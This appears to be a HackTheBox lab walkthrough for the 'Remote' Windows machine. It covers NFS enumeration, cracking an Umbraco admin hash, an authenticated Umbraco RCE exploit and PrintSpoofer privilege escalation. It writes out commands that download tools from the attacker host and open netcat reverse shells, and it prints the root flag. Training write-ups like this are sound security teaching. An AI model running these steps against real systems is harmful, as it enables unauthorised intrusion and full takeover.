---
layout: page
title: Remote
description: Remote from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/remote/logo.png" title="HTB Remote Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Remote">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
All kinds of fun stuff with Remote.

Get a list of the available port with nmap.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.180            
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 10:45 AEDT
Nmap scan report for 10.10.10.180
Host is up (0.015s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=1/21%OT=21%CT=1%CU=39855%PV=Y%DS=2%DC=T%G=Y%TM=678EE06
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=108%GCD=1%ISR
OS:=109%II=I%TS=U)SEQ(SP=108%GCD=1%ISR=10B%TS=U)SEQ(SP=FE%GCD=1%ISR=10B%TI=
OS:I%CI=I%II=I%SS=S%TS=U)OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O4=M53A
OS:NW8NNS%O5=M53ANW8NNS%O6=M53ANNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=F
OS:FFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=
OS:80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-21T00:46:41
|_  start_date: N/A
|_clock-skew: 1h00m05s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   14.94 ms 10.10.16.1
2   14.95 ms 10.10.10.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.38 seconds
```
{% endraw %}

<br />
Run the full nmap to make sure there are no pesky hidden services.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.180              
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 10:46 AEDT
Nmap scan report for 10.10.10.180
Host is up (0.012s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 17.49 seconds
```
{% endraw %}

<br />
Try logging into FTP with the anonymous account and get the directory listing.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.180                                                                                                      
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49685|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> dir
229 Entering Extended Passive Mode (|||49686|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> pwd
Remote directory: /
```
{% endraw %}

<br />
Run all of the nmap script for nfs on port 111.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$  nmap --script=*nfs* -p 111 10.10.10.180                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 10:50 AEDT
Nmap scan report for 10.10.10.180
Host is up (0.0081s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /site_backups
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
| rwx------   4294967294  4294967294  4096   2020-02-23T18:35:48  .
| ??????????  ?           ?           ?      ?                    ..
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:39  App_Browsers
| rwx------   4294967294  4294967294  4096   2020-02-20T17:17:19  App_Data
| rwx------   4294967294  4294967294  4096   2020-02-20T17:16:40  App_Plugins
| rwx------   4294967294  4294967294  8192   2020-02-20T17:16:42  Config
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:40  aspnet_client
| rwx------   4294967294  4294967294  49152  2020-02-20T17:16:42  bin
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:42  css
| rwx------   4294967294  4294967294  152    2018-11-01T17:06:44  default.aspx
|_
| nfs-statfs: 
|   Filesystem     1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
|_  /site_backups  24827900.0  11749384.0  13078516.0  48%   16.0T        1023
| nfs-showmount: 
|_  /site_backups 

Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds
```
{% endraw %}

<br />
Mount the nfs site_backups share to a created site_backups folder.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ sudo mount -t nfs 10.10.10.180:/site_backups site_backups 
[sudo] password for kali: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ cd site_backups 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/remote/site_backups]
└─$ ls
App_Browsers  App_Data  App_Plugins  Config  Global.asax  Media  Umbraco  Umbraco_Client  Views  Web.config  aspnet_client  bin  css  default.aspx  scripts
```
{% endraw %}

<br />
Review the website and notice the Umbraco login.

{% raw %}
```sh
http://10.10.10.180/umbraco/#/login
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/remote/loginpage.png" title="Check the Login Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
In the nfs share, look for the connection string in the Web.config file.  Notice the umbraco.sdf.

{% raw %}
```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>

    <snip>

    <connectionStrings>
		<remove name="umbracoDbDSN" />
		<add name="umbracoDbDSN" connectionString="Data Source=|DataDirectory|\Umbraco.sdf;Flush Interval=1;" providerName="System.Data.SqlServerCe.4.0" />
		<!-- Important: If you're upgrading Umbraco, do not clear the connection string / provider name during your web.config merge. -->
	</connectionStrings>

    <snip>

</configuration>
```
{% endraw %}

<br />
Run strings against the umbraco.sdf file.

{% raw %}
```sh
┌──(kali㉿kali)-[~/…/htb/remote/site_backups/App_Data]
└─$ strings Umbraco.sdf                                      
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32

<snip>
```
{% endraw %}

<br />
Notice the SHA1 hash value.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/remote/hashvalue.png" title="Notice the Hash Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the hash value through crackstation.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/remote/crackstation.png" title="Crack the Hash" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Review the strings output again to get the user name.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/remote/username.png" title="Get the username" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test the credentials and try to login.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/remote/landing.png" title="Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click the '?' icon to open a side-panel and get the Umbraco version.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/remote/version.png" title="Get the Umbraco Version" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run searchsploit for the Umbraco verion.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ searchsploit umbraco 7.12.4                                                           
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                                                                | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                                                                | aspx/webapps/49488.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
{% endraw %}

<br />
Transfer the python script to the local working folder.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ cp $(locate 49488.py) .
```
{% endraw %}

<br />
Run the exploit and run whoami to test command executions.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ python3 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
iis apppool\defaultapppool
```
{% endraw %}

<br />
Use the Revshells to get a powershell reverse tcp one-liner.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/remote/revshells.png" title="Get the Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ sudo nc -nlvp 443                                        
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.180] 49805
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
PS C:\Users\Public\Desktop> cat user.txt
<redacted>
PS C:\Users\Public\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::43d:2e9:512f:af70
   Link-local IPv6 Address . . . . . : fe80::43d:2e9:512f:af70%12
   IPv4 Address. . . . . . . . . . . : 10.10.10.180
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6def%12
                                       10.10.10.2
```
{% endraw %}

<br />
Run the systeminfo to get useful nuggets like the OS and architecture.

{% raw %}
```bash
PS C:\Users\Public\Desktop> systeminfo

Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA801
Original Install Date:     2/19/2020, 3:03:29 PM
System Boot Time:          1/26/2025, 1:41:17 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC

<snip>
```
{% endraw %}

<br />
Run whoami /priv to get the privileges.

{% raw %}
```bash
PS C:\Users\Public\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\Users\Public\Desktop> 0
                                 [02]: fe80::43d:2e9:512f:af70
                                 [03]: dead:beef::43d:2e9:512f:af70
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
0
```
{% endraw %}

<br />
Lookup the hacktricks article on SeImpersonate abuse.

{% raw %}
```bash
https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/remote/hacktricks.png" title="Check the Hacktricks Article" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the PrintSpoofer executable.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe                                                
--2025-01-27 02:29:13--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250126%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250126T152917Z&X-Amz-Expires=300&X-Amz-Signature=cddf995d5cbe5c4805cc681dd9273b59e1ee36d3440a4350565b202225a61369&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream [following]
--2025-01-27 02:29:13--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250126%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250126T152917Z&X-Amz-Expires=300&X-Amz-Signature=cddf995d5cbe5c4805cc681dd9273b59e1ee36d3440a4350565b202225a61369&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer64.exe’

PrintSpoofer64.exe                                         100%[========================================================================================================================================>]  26.50K  --.-KB/s    in 0.006s  

2025-01-27 02:29:14 (4.65 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]
```
{% endraw %}

<br />
Start a webserver to serve the executable.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Use Powershell to transfer the exploit to the victim machine.

{% raw %}
```bash
PS C:\Windows\Temp> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.12:8000/PrintSpoofer64.exe", "C:\Windows\Temp\PrintSpoofer64.exe")
```
{% endraw %}

<br />
Copy the nc.exe into the working folder.  Then, use Powershell to transfer it to the local machine.

{% raw %}
```bash
PS C:\Windows\Temp> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.12:8000/nc.exe", "C:\Windows\Temp\nc.exe")
```
{% endraw %}

<br />
Start a second listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ nc -nlvp 4444                                            
listening on [any] 4444 ...
```
{% endraw %}

<br />
Execute the PrintSpoofer executable and use the netcat executable to create a reverse shell with the listener that was just started.

{% raw %}
```bash
PS C:\Windows\Temp> C:\Windows\Temp\PrintSpoofer64.exe -c "c:\Windows\Temp\nc.exe 10.10.16.12 4444 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/remote]
└─$ nc -nlvp 4444                                            
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.180] 49817
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
2f0ff290987192dc848b29e231f4cc73

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::43d:2e9:512f:af70
   Link-local IPv6 Address . . . . . : fe80::43d:2e9:512f:af70%12
   IPv4 Address. . . . . . . . . . . : 10.10.10.180
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6def%12
                                       10.10.10.2
```
{% endraw %}

<br />
With that, we bring Remote to an end.